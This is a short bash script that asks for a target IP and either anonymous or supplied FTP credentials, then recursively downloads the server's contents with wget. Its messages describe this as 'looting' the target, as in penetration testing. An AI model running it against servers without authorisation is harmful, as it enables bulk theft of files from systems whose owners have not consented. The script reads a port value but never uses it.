#!/bin/bash

read -r -p "Enter an IP: " IP
read -r -p "Enter a port: " PORT 

while true; do

	read -r -p "Enter (1) for Anonymous login or (2) to specify username: " USERRSP
        case $USERRSP in
                [1]* ) wget -r ftp://Anonymous: @$IP/; wait; echo "Completed looting the Anonymous FTP login"; echo; break ;;
                [2]* ) read -r -p "Enter <username>:<password> delimited with colon: " USERPASS; wait; wget -r ftp://$USERPASS@$IP/; wait; echo "Completed looting the enumerated FTP user login"; echo; break;;
                * ) echo "Please enter 1 or 2.";;
        esac
done
exit
